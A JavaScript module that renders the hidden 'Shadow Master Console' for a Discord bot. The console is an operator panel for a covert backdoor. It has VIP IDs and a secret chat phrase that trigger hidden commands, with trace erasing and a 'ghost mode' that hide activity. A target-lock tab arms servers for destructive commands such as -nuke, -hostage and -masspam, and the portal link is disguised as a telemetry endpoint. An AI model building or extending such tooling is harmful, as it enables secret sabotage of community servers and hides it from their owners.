function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll("\"", "&quot;")
        .replaceAll("'", "&#39;");
}

function escapeAttr(value) {
    return escapeHtml(value);
}

function hiddenInput(name, value) {
    return `<input type="hidden" name="${escapeAttr(name)}" value="${escapeAttr(value)}">`;
}

function renderShadowDashboardPage(viewData = {}, state = {}) {
    const {
        SHADOW_CSS = "",
        safeSecretPhrase = "",
        portalBaseUrl = "",
        tracePolicyRows = "",
        traceMetricRows = "",
        toggleRows = "",
        guildRows = "",
        vipRows = "",
        sessionRows = "",
        cmdRows = "",
        botStats = null
    } = viewData;

    const {
        ghostModeEnabled = false,
        protectedSessionCount = 0,
        armedGuildCount = 0,
        globalAdminCount = 0,
        traceKillSwitchEnabled = false,
        traceDryRunEnabled = false,
        tracePolicyDefault = "approval",
        protectedChannelCount = 0,
        traceRateLimitMax = 0,
        traceRateLimitWindowSeconds = 0
    } = state;

    return `<!DOCTYPE html><html lang="th"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>👁️‍🗨️ Shadow Master Console</title>
<style>${SHADOW_CSS}</style>
</head><body>
<div class="container">

<div class="shadow-header">
    <div class="shadow-title">👁️‍🗨️ SHADOW MASTER CONSOLE</div>
    <div class="shadow-sub">ศูนย์บัญชาการลับ — Top Secret / Classified</div>
    <div style="margin-top:8px;display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;">
        <span class="badge ${ghostModeEnabled ? 'badge-armed' : 'badge-on'}">${ghostModeEnabled ? '👻 GHOST MODE ON' : '⭕ Ghost Mode Off'}</span>
        <span class="badge" style="background:rgba(99,102,241,.15);color:#818cf8;border:1px solid rgba(99,102,241,.3);">🛡️ Protected: ${escapeHtml(protectedSessionCount)} sessions</span>
        <a href="/" style="background:var(--bg2);color:var(--text2);padding:4px 12px;border-radius:8px;text-decoration:none;font-size:0.75em;border:1px solid var(--border);">→ Main Dashboard</a>
    </div>
</div>

<!-- Navigation Tabs -->
<div class="tabs">
    <a class="tab-btn active" onclick="showTab('overview',this)">📊 Overview</a>
    <a class="tab-btn" onclick="showTab('toggles',this)">🎛️ Switches</a>
    <a class="tab-btn" onclick="showTab('targets',this)">🎯 Target Lock</a>
    <a class="tab-btn" onclick="showTab('sessions',this)">📡 Sessions</a>
    <a class="tab-btn" onclick="showTab('vip',this)">👥 VIP</a>
    <a class="tab-btn" onclick="showTab('manual',this)">📖 Manual</a>
    <a class="tab-btn" onclick="showTab('settings',this)">⚙️ Settings</a>
</div>

<!-- ── TAB: Overview ── -->
<div class="section active" id="tab-overview">
    ${botStats ? `
    <div class="grid3" style="margin-bottom:14px;">
        <div class="stat-box"><div class="stat-val" style="color:var(--red2);">${escapeHtml(botStats.guilds)}</div><div class="stat-lbl">🌐 Guilds</div></div>
        <div class="stat-box"><div class="stat-val" style="color:var(--yellow);">${escapeHtml(botStats.ping)}ms</div><div class="stat-lbl">🏓 Ping</div></div>
        <div class="stat-box"><div class="stat-val" style="color:var(--purple);">${escapeHtml(botStats.ram)} MB</div><div class="stat-lbl">🧠 RAM</div></div>
        <div class="stat-box"><div class="stat-val" style="color:var(--green);">${escapeHtml(botStats.uptime)}m</div><div class="stat-lbl">⏱️ Uptime</div></div>
        <div class="stat-box"><div class="stat-val" style="color:var(--red2);">${escapeHtml(armedGuildCount)}</div><div class="stat-lbl">⚠️ Armed</div></div>
        <div class="stat-box"><div class="stat-val" style="color:#f97316;">${escapeHtml(globalAdminCount)}</div><div class="stat-lbl">👥 VIPs</div></div>
    </div>
    <div class="card">
        <h3>🤖 Bot Status</h3>
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
            <span style="color:var(--green);font-weight:700;">🟢 ${escapeHtml(botStats.tag)}</span>
            <span style="color:var(--text3);font-size:0.82em;">Ping: ${escapeHtml(botStats.ping)}ms | Uptime: ${escapeHtml(botStats.uptime)}m | RAM: ${escapeHtml(botStats.ram)}MB</span>
        </div>
    </div>` : '<div class="card"><h3>🤖 Bot Status</h3><p style="color:var(--red2);">🔴 Bot Offline</p></div>'}

    <div class="card">
        <h3>⚡ Quick Actions</h3>
        <div class="grid2">
            <form method="POST">
                ${hiddenInput("action", "ghost_toggle")}
                <button type="submit" class="btn ${ghostModeEnabled ? 'btn-success' : 'btn-danger'}">${ghostModeEnabled ? '⭕ ปิด Ghost Mode' : '👻 เปิด Ghost Mode'}</button>
            </form>
            <a href="/" class="btn btn-purple" style="text-align:center;text-decoration:none;display:flex;align-items:center;justify-content:center;">🌐 Main Dashboard</a>
        </div>
    </div>

    <div class="card">
        <h3>🕐 Recent Activity</h3>
        <p style="color:var(--text3);font-size:0.82em;text-align:center;padding:12px 0;">Log จะแสดงใน Webhook ลับของคุณ — เปิด WEBHOOK_LOG_URL เพื่อดู</p>
    </div>
</div>

<!-- ── TAB: Switches ── -->
<div class="section" id="tab-toggles">
    <div class="card">
        <h3>🎛️ System Feature Switches</h3>
        <p style="color:var(--text3);font-size:0.78em;margin-bottom:14px;">ปิด/เปิดฟีเจอร์แต่ละอย่างได้อิสระ — มีผลทันที</p>
        ${toggleRows}
    </div>
    <div class="card">
        <h3>🧹 Trace Eraser Guard</h3>
        <p style="color:var(--text3);font-size:0.78em;margin-bottom:12px;">Guard ชั้นนี้ควบคุม policy, dry-run, kill switch, protected channel และ rate limit</p>
        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:10px;margin-bottom:12px;">
            <div class="status-card">
                <span>Default Policy</span>
                <strong>${escapeHtml(tracePolicyDefault)}</strong>
            </div>
            <div class="status-card">
                <span>Protected Channel IDs</span>
                <strong>${escapeHtml(protectedChannelCount)}</strong>
            </div>
            <div class="status-card">
                <span>Rate Limit</span>
                <strong>${escapeHtml(traceRateLimitMax)}/${escapeHtml(traceRateLimitWindowSeconds)}s</strong>
            </div>
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
            <form method="POST" style="margin:0;">
                ${hiddenInput("action", "trace_kill_toggle")}
                <button type="submit" class="btn ${traceKillSwitchEnabled ? 'btn-success' : 'btn-danger'} btn-sm" style="width:auto;">${traceKillSwitchEnabled ? 'เปิด Trace Eraser' : 'Kill Switch'}</button>
            </form>
            <form method="POST" style="margin:0;">
                ${hiddenInput("action", "trace_dry_run_toggle")}
                <button type="submit" class="btn ${traceDryRunEnabled ? 'btn-success' : 'btn-purple'} btn-sm" style="width:auto;">Dry-run: ${traceDryRunEnabled ? 'ON' : 'OFF'}</button>
            </form>
        </div>
        <h4 style="margin:12px 0 6px;color:var(--text2);">Guild Policy</h4>
        ${tracePolicyRows}
        <h4 style="margin:14px 0 6px;color:var(--text2);">Metrics</h4>
        ${traceMetricRows}
    </div>
</div>

<!-- ── TAB: Target Lock ── -->
<div class="section" id="tab-targets">
    <div class="card">
        <h3>🎯 Target Lock — ARM/DISARM Guilds</h3>
        <p style="color:var(--red2);font-size:0.78em;margin-bottom:14px;">⚠️ ต้อง ARM ก่อนถึงจะใช้คำสั่งทำลายล้างได้ (-nuke, -hostage, -ruinroles, -spamvc, -masspam)</p>
        <table>
            <thead><tr>
                <th>เซิร์ฟเวอร์</th>
                <th style="text-align:center;">สมาชิก</th>
                <th style="text-align:center;">สถานะ</th>
                <th style="text-align:center;">คำสั่ง</th>
            </tr></thead>
            <tbody>${guildRows}</tbody>
        </table>
    </div>
</div>

<!-- ── TAB: Sessions ── -->
<div class="section" id="tab-sessions">
    <div class="card">
        <h3>📡 Active Voice Sessions</h3>
        <p style="color:var(--text3);font-size:0.78em;margin-bottom:14px;">🛡️ Protected session ไม่สามารถหยุดได้จาก Dashboard ปกติ</p>
        <table>
            <thead><tr>
                <th>Session ID</th>
                <th>เซิร์ฟเวอร์</th>
                <th style="text-align:center;">Uptime</th>
                <th style="text-align:center;">จัดการ</th>
            </tr></thead>
            <tbody>${sessionRows}</tbody>
        </table>
    </div>
</div>

<!-- ── TAB: VIP ── -->
<div class="section" id="tab-vip">
    <div class="card">
        <h3>👥 VIP — ไอดีที่ได้รับสิทธิ์รันคำสั่งลับ</h3>
        <form method="POST" style="display:flex;gap:8px;margin-bottom:16px;">
            ${hiddenInput("action", "add_vip")}
            <input type="text" name="vip_id" placeholder="Discord User ID..." style="flex:1;margin-top:0;">
            <button type="submit" class="btn btn-success btn-sm" style="width:auto;">➕ เพิ่ม VIP</button>
        </form>
        <div>${vipRows}</div>
    </div>
    <div class="card">
        <h3>🔑 SECRET PHRASE</h3>
        <p style="color:var(--text3);font-size:0.82em;margin-bottom:10px;">วิธีใช้: พิมพ์ข้อความนี้ในห้องแชทของเซิร์ฟเวอร์นั้น ตามด้วยคำสั่ง</p>
        <code style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:0.9em;color:var(--yellow);display:block;word-break:break-all;">${safeSecretPhrase}</code>
        <p style="color:var(--text3);font-size:0.72em;margin-top:8px;">* บอทจะลบข้อความทิ้งทันทีหลังประมวลผล — ไม่มีร่องรอย</p>
    </div>
</div>

<!-- ── TAB: Manual ── -->
<div class="section" id="tab-manual">
    <div class="card">
        <h3>📖 คู่มือคำสั่งลับทั้งหมด</h3>
        <div style="display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;">
            <span class="cmd-tag cmd-normal" style="padding:3px 10px;">🟡 Normal — ใช้ได้เสมอ</span>
            <span class="cmd-tag cmd-armed" style="padding:3px 10px;">🔴 ARMED — ต้อง ARM guild ก่อน</span>
            <span class="cmd-tag cmd-new" style="padding:3px 10px;">✨ NEW — ฟีเจอร์ใหม่</span>
        </div>
        ${cmdRows}
    </div>
</div>

<!-- ── TAB: Settings ── -->
<div class="section" id="tab-settings">
    <div class="grid2">
        <div class="card">
            <h3>🔑 เปลี่ยนรหัสผ่าน Portal</h3>
            <form method="POST">
                ${hiddenInput("action", "change_pin")}
                <label>รหัส PIN ใหม่</label>
                <input type="text" name="new_pin" placeholder="กรอกรหัสใหม่...">
                <button type="submit" class="btn btn-warn">🔑 บันทึกรหัสใหม่</button>
            </form>
            <p style="color:var(--text3);font-size:0.72em;margin-top:8px;">* บอทจะยิง Webhook แจ้งเตือนทันทีเมื่อเปลี่ยน</p>
        </div>
        <div class="card">
            <h3>🔗 ลิงก์ Portal</h3>
            <p style="color:var(--text3);font-size:0.8em;margin-bottom:10px;">ลิงก์เข้า Shadow Portal ด้วย PIN ปัจจุบัน:</p>
            <code id="portalLink" style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:8px;font-size:0.72em;color:var(--yellow);display:block;word-break:break-all;cursor:pointer;" onclick="copyLink()" title="คลิกเพื่อ copy">
                ${portalBaseUrl}/api/v1/telemetry/snapshot
            </code>
            <p style="color:var(--text3);font-size:0.7em;margin-top:6px;">คลิกที่ลิงก์เพื่อ copy</p>
        </div>
    </div>
    <div class="card">
        <h3>⚠️ Danger Zone</h3>
        <div class="grid2">
            <form method="POST">
                ${hiddenInput("action", "ghost_toggle")}
                <button type="submit" class="btn ${ghostModeEnabled ? 'btn-success' : 'btn-danger'}">${ghostModeEnabled ? '⭕ ปิด Ghost Mode' : '👻 เปิด Ghost Mode'}</button>
            </form>
            <a href="/" class="btn btn-purple" style="display:flex;align-items:center;justify-content:center;text-decoration:none;">🌐 กลับ Main Dashboard</a>
        </div>
    </div>
</div>

</div><!-- end container -->

<div class="toast" id="toast"></div>

<script>
// Tab switching
function showTab(id, el) {
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-'+id).classList.add('active');
    if(el) el.classList.add('active');
}

// Toast
function showToast(msg, type='ok') {
    const t = document.getElementById('toast');
    t.textContent = msg; t.className = 'toast '+type;
    t.style.display = 'block';
    clearTimeout(t.__t);
    t.__t = setTimeout(() => t.style.display='none', 3500);
}

// Copy portal link
function copyLink() {
    const link = document.getElementById('portalLink').textContent.trim();
    navigator.clipboard.writeText(link).then(() => showToast('✅ คัดลอกลิงก์แล้ว','ok')).catch(()=>showToast('❌ Copy ไม่ได้','err'));
}

// Restore tab from hash
window.addEventListener('DOMContentLoaded', () => {
    const hash = window.location.hash.replace('#','');
    if(hash) {
        const btn = document.querySelector('[onclick*="'+hash+'"]');
        if(btn) showTab(hash, btn);
    }
});

// Save tab state
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const match = btn.getAttribute('onclick').match(/'([^']+)'/);
        if(match) window.location.hash = match[1];
    });
});
</script>

</body></html>`;
}

module.exports = {
    renderShadowDashboardPage,
    _test: {
        escapeHtml,
        hiddenInput
    }
};
